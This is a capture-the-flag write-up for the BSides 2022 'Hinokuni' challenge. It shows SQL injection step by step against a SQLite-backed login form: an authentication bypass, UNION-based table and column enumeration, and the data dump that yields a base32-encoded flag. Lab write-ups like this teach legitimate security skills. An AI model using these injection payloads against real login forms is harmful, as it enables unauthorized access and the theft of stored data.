---
title: bsides2022 – Hinokuni
tags: SQL, injection
---

## Challenge

> TODO: finish Konohagakure's homepage

The link led to a website that showed a login form. Any username/password combination entered allowed a login, leading to a page with the following content and a link to log out:

```
Y0u g07 |7 <0ngr47$[]
```

## Solution

### Discovery

The password field allows SQL injection. So entering `' OR 1==1 --` would allow you to log in and show the following:

```
Y0u g07 |7 <0ngr47$
[{"id":1,"password":"teja"},
{"id":2,"password":"user1"},
{"id":3,"password":"user2"},
{"id":4,"password":"krishna"},
{"id":5,"password":"sai"}]
```

It seems like the empty square brackets in the original output was the output of a SQL query of the passwords database. (Also: Don't store passwords in plain text maybe? 🤷‍♂️)

Using `sqlmap`, I found out that this is a SQLite installation.

### Exploitation

Using a UNION, we can append any further SQL query with the same amount of rows on the database to the output, exfiltrating any data we want. To find out how many rows are actually queried (this doesn't have to be the same as the printed output), we can add a `,1` to `' OR 1==1 UNION SELECT 1,1,[…] --` and check whether or not we get an output (no output means an SQL error). We confirm that the original query has two parameters.

SQL databases generally have a table that stores all available tables in the database. By querying this table, we can see what data might be available. The query here is `' UNION SELECT  1, name FROM sqlite_schema --`. I am no longer bypassing the login to only get the new data. This returns:

```
Y0u g07 |7 <0ngr47$
[{"id":1,"password":"customers"},
{"id":1,"password":"data"},
{"id":1,"password":"media_types"},
{"id":1,"password":"sqlite_sequence"},
{"id":1,"password":"users"}]
```

The `id` is always `1` (as we queried `1` for the first row), while the `password` field actually contains the table names: `customers`, `data`, `media_types`, `sqlite_sequence`, `users`.

Next, I wanted to query `data`. To be able to do this, I first needed the column names. Fortunately, SQLite provides a macro that gets those for any table (other databases usually have a table for this). Query: `' UNION SELECT 1, name FROM pragma_table_info('data') --` Result:

```
Y0u g07 |7 <0ngr47$
[{"id":1,"password":"id"},
{"id":1,"password":"label"},
{"id":1,"password":"otp"}]
```

Again, the `password` field is the interesting one. So we got columns `id`, `label`, and `otp`. `id` seems the least interesting, so I queried `label` and `otp`: `' UNION SELECT label, otp FROM data --`. This returned a lot of data (~100000 rows), so here are the first few:

```
Y0u g07 |7 <0ngr47$
[{"id":"MZWGCZ33NAYGWYLHGNPWINDUORSWENDZGB6Q====","password":499497},
{"id":"SUCCESS","password":1},
{"id":"SUCCESS","password":2},
{"id":"SUCCESS","password":100010},
{"id":"SUCCESS","password":100032},
{"id":"SUCCESS","password":100037},
{"id":"SUCCESS","password":100082},
{"id":"SUCCESS","password":100098},
{"id":"SUCCESS","password":100114},
{"id":"SUCCESS","password":100136},
{"id":"SUCCESS","password":100141},
{"id":"SUCCESS","password":100142},
{"id":"SUCCESS","password":100156},
{"id":"SUCCESS","password":100163},
{"id":"SUCCESS","password":100170},
{"id":"SUCCESS","password":100184},
{"id":"SUCCESS","password":100188},
{"id":"SUCCESS","password":100194},
{"id":"SUCCESS","password":100202},
{"id":"SUCCESS","password":100219},
{"id":"SUCCESS","password":100223},
{"id":"SUCCESS","password":100239},
{"id":"SUCCESS","password":100245},
{"id":"SUCCESS","password":100250},
{"id":"SUCCESS","password":100257}]
```

The first `label` entry seemed interesting here (`MZWGCZ33NAYGWYLHGNPWINDUORSWENDZGB6Q====`). It seems to be some sort of encoding. The `====` might indicate `base64`, but it has too many `=`s and only upper case letters, so I tried `base32`, and got:

```
flag{h0kag3_d4tteb4y0}
```
